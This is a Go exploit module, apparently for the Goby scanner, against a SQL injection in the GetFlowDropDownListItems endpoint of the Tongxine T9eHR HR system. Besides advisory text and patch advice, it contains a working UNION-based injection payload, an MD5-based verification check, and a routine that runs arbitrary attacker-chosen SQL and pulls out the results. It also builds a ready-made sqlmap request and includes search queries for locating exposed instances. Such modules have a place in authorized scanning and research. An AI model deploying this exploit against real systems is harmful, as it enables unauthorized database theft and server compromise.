package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Tongxine T9eHR Information Management System GetFlowDropDownListItems SQL Injection Vulnerability",
    "Description": "<p>Guangzhou Tongxine Technology Co., Ltd. is a high-tech group company specializing in human resource management system, eHR/OA integrated intelligent cloud platform, intelligent card cloud platform, industry software development and customization, intelligent enterprise management information consulting and project service as the core business of consulting management consulting and software personalized customization development. </p><p>SQL injection vulnerability exists in GetFlowDropDownListItems interface of T9eHR information management system. Attackers can obtain sensitive database information through this vulnerability and further exploit it to cause the server to fall.</p>",
    "Product": "Tongxin-T9EHR-Information-MS",
    "Homepage": "http://www.tongxine.com/",
    "DisclosureDate": "2024-08-27",
    "PostTime": "2024-08-28",
    "Author": "hhh3156",
    "FofaQuery": "body=\"T9eHR\" && body=\"/TX.CDN/\"",
    "GobyQuery": "body=\"T9eHR\" && body=\"/TX.CDN/\"",
    "Level": "2",
    "Impact": "<p>SQL injection vulnerability exists in GetFlowDropDownListItems interface of T9eHR information management system. Attackers can obtain sensitive database information through this vulnerability and further exploit it to cause the server to fall.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.tongxine.com/\">http://www.tongxine.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "db_name()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "同鑫T9eHR信息化管理系统 GetFlowDropDownListItems SQL 注入漏洞",
            "Product": "同鑫T9eHR信息化管理系统",
            "Description": "<p>广州同鑫科技有限公司是专业从事人力资源管理系统、eHR/OA一体化智慧云平台、智慧一卡通云平台、行业软件开发与定制、智慧企业管理信息化咨询与项目服务为核心业务的顾问式管理咨询和软件个性定制开发的高科技股份集团公司。</p><p>T9eHR信息化管理系统&nbsp; GetFlowDropDownListItems 接口存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息，进一步利用可导致服务器失陷。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.tongxine.com/\">http://www.tongxine.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>T9eHR信息化管理系统&nbsp; GetFlowDropDownListItems 接口存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息，进一步利用可导致服务器失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Tongxine T9eHR Information Management System GetFlowDropDownListItems SQL Injection Vulnerability",
            "Product": "Tongxin-T9EHR-Information-MS",
            "Description": "<p>Guangzhou Tongxine Technology Co., Ltd. is a high-tech group company specializing in human resource management system, eHR/OA integrated intelligent cloud platform, intelligent card cloud platform, industry software development and customization, intelligent enterprise management information consulting and project service as the core business of consulting management consulting and software personalized customization development.&nbsp;</p><p>SQL injection vulnerability exists in GetFlowDropDownListItems interface of T9eHR information management system. Attackers can obtain sensitive database information through this vulnerability and further exploit it to cause the server to fall.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.tongxine.com/\">http://www.tongxine.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>SQL injection vulnerability exists in GetFlowDropDownListItems interface of T9eHR information management system. Attackers can obtain sensitive database information through this vulnerability and further exploit it to cause the server to fall.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9946"
}`

	setSqlPayloadHash_houhf84894UAByf20LAiq93PKMVna8 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget := `/Common/GetFlowDropDownListItems`
		data := `FixedFormCode=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2B` + url.QueryEscape(sql) + `%2BCHAR%28113%29--+`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded; charset=utf-8",
			"Referer":         hostInfo.FixedHostInfo,
		}
		resp, err = setPostRequest(hostInfo, urlget, data, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = `/Common/GetFlowDropDownListItems`

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			MD5 := func(v string) string {
				d := []byte(v)
				m := md5.New()
				m.Write(d)
				return hex.EncodeToString(m.Sum(nil))
			}
			randomString := goutils.RandomHexString(8)

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := MD5(randomString)

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `(SELECT (sys.fn_sqlvarbasetostr(HASHBYTES('MD5',CONVERT(varCHAR(8),'` + randomString + `')))))`

			sendPayload := setSqlPayloadHash_houhf84894UAByf20LAiq93PKMVna8

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /Common/GetFlowDropDownListItems HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nFixedFormCode=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2Bdb_name()%2BCHAR%28113%29--+"

			// 2.配置正则语句，从响应包中提取出数据
			regular := `selected>q([\s\S]*?)q</option>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_houhf84894UAByf20LAiq93PKMVna8
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
